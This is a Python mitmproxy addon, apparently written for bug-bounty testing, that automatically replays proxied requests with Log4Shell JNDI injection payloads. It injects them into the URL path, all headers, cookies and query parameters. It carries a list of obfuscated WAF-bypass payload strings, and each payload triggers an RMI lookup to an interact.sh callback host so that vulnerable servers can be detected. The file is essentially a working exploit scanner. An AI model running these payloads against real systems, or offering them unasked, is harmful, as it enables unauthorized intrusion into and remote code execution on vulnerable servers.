"""
Addon for logging path

Run as follows: mitmproxy -s log4j4all.py
"""
from mitmproxy import http, ctx
import random
import hashlib

from query_logger import Query

callback_host = "qop8xb08080m4m9dop2h5s6431f584plu.interact.sh" #replace host
waf_bypass_payloads = ["${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://%s.%s",
                       "${${::-j}ndi:rmi://%s.%s",
                       "${jndi:rmi://{{callback_host}}}",
                       "${${lower:jndi}:${lower:rmi}://%s.%s",
                       "${${lower:${lower:jndi}}:${lower:rmi}://%s.%s",
                       "${${lower:j}${lower:n}${lower:d}i:${lower:rmi}://%s.%s",
                       "${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://%s.%s",
                       "${jndi:dns://{{callback_host}}}"]
scope = [""]#replace scope
out_of_scope = [""]#replace oos

class Log4j4all:
    def request(self, flow: http.HTTPFlow):
        try:
            with open("crawled.dat", 'r') as file:
                pass    
            file.close()
        except FileNotFoundError:
            with open("crawled.dat", 'w') as file:
                file.write("00000000000000000000000000000000")
            file.close
        
        if self.check_scope(flow.request.host):
            if flow.is_replay == "request":
                return

            if self.chech_hash(flow):
                return

            path = flow.request.path
            host = flow.request.host

            path_flow = flow.copy()
            self.path_test(path_flow, path, host)
            for k, v in flow.request.headers.items():
                if k == "cookie":
                    for (k, v) in flow.request.cookies.items():
                        cookies_flow = flow.copy()
                        self.cookie_test(cookies_flow, path, host, k)
                else:
                    header_flow = flow.copy()
                    self.header_test(header_flow, path, host, k)
            for (k, v) in flow.request.query.items():
                query_flow = flow.copy()
                self.query_test(query_flow, path, host, k)

    def path_test(self, flow, path, host):
        rndind = ''.join(random.choice(
            '0123456789abcdefghijklmnopqrstuvwxyz') for i in range(6))
        payload = '${${lower:j}${lower:n}${lower:d}i:${lower:rmi}://%s.%s}' % (rndind, callback_host)
        if flow.request.path.endswith("/"):
            flow.request.path = flow.request.path+payload
        with open("log4j.log", 'a') as file:
            file.write("Host: "+host+" Path: "+path +
                       " Rand: "+rndind + " InjPoint: path" + ":\n\t"+payload+"\n")
        file.close()
        ctx.master.commands.call("replay.client", [flow])

    def header_test(self, flow, path, host, key):
        rndind = ''.join(random.choice(
            '0123456789abcdefghijklmnopqrstuvwxyz') for i in range(6))
        payload = '${${lower:j}${lower:n}${lower:d}i:${lower:rmi}://%s.%s' % (rndind, callback_host)
        flow.request.headers[key] = payload
        with open("log4j.log", 'a') as file:
            file.write("Host: "+host+" Path: "+path +
                       " Rand: "+rndind + " InjPoint: header: " + key + ":\n\t"+payload+"\n")
        file.close()
        ctx.master.commands.call("replay.client", [flow])

    def cookie_test(self, flow, path, host, key):
        rndind = ''.join(random.choice(
            '0123456789abcdefghijklmnopqrstuvwxyz') for i in range(6))
        payload = '${${lower:j}${lower:n}${lower:d}i:${lower:rmi}://%s.%s' % (rndind, callback_host)
        flow.request.cookies[key] = payload
        with open("log4j.log", 'a') as file:
            file.write("Host: "+host+" Path: "+path +
                       " Rand: "+rndind + " InjPoint: cookie: " + key + ":\n\t"+payload+"\n")
        file.close()
        ctx.master.commands.call("replay.client", [flow])

    def query_test(self, flow, path, host, key):
        rndind = ''.join(random.choice(
            '0123456789abcdefghijklmnopqrstuvwxyz') for i in range(6))
        payload = '${${lower:j}${lower:n}${lower:d}i:${lower:rmi}://%s.%s' % (rndind, callback_host)
        flow.request.query[key] = payload
        with open("log4j.log", 'a') as file:
            file.write("Host: "+host+" Path: "+path +
                       " Rand: "+rndind + " InjPoint: query: " + key + ":\n\t"+payload+"\n")
        file.close()
        ctx.master.commands.call("replay.client", [flow])

    def check_scope(self, host) -> bool:
        code = self.check_scope_inner(host)
        if code == 0:
            return True
        if code == 1:
            log_scope("Out of scope: "+ host + "\n")
            return False
        if code == 2:
            log_scope("Sus: "+ host + "\n")
            return False
        if code == 3:
            log_scope("Not in scope: "+ host + "\n")
            return False

    def check_scope_inner(self, host) -> int:
        for disallow in out_of_scope:
            if host.endswith(disallow):
                return 1
            elif disallow in host:
                return 2
        for allow in scope:
            if allow in host:
                return 0
            else:
                pass
        return 3

    def chech_hash(self, flow) -> bool:
        new_hash = self.hasher(flow)
        with open("crawled.dat", 'a+t') as file:
            file.seek(0)
            while True:
                store_hash = file.read(32)
                if store_hash == new_hash:
                    file.close()
                    return True
                eof = file.read(1)
                if eof == "":
                    file.write("."+new_hash)
                    file.close()
                    return False

    def hasher(self, flow) -> str:
        host = flow.request.host
        path = flow.request.path
        query = "".join(flow.request.query.keys())
        clt = host+path+query
        bhash = hashlib.md5(clt.encode('utf-8'))
        shash = bhash.hexdigest()
        return shash

def log_scope(s):
    with open("scope.log", 'a') as file:
            file.write(s)
    file.close()


addons = [
    Log4j4all()
]
